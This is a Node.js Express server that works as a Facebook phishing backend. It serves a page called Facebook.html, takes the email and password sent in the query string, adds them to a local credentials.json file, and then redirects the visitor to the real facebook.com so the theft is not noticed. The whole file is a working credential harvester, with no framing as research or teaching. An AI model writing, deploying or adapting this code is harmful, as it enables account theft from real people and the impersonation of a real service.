const express = require('express')
const path = require('path')
const app = express();
var fs = require('fs');
const PORT = process.env.PORT || 8000

app.listen(PORT, () => console.log(`Listening on ${ PORT }`))

var fs = require('fs');

app.get('/', (req, res) => {
	if (Object.keys(req.query).length == 0){
		res.sendFile(path.join(__dirname, '/Facebook.html'));
	}
	if (Object.keys(req.query).length > 0){
		fs.readFile('./credentials.json', 'utf-8', function(err, data) {
				if (err) throw err

				var arrayOfObjects = JSON.parse(data);
				var user_data = {
					"email":req.query.email,
					"pass":req.query.pass
				}
				if (user_data.pass == null || user_data.pass == "") return; 
				arrayOfObjects.users.push(user_data);

				fs.writeFile('./credentials.json', JSON.stringify(arrayOfObjects), 'utf-8', function(err) {
					if (err) throw err
					console.log('Done!')
				})
		})
		res.redirect('http://facebook.com');
	}
});
app.post('/', (req, res) => {
	if (Object.keys(req.query).length == 0){
		res.sendFile(path.join(__dirname, '/Facebook.html'));
	}
});

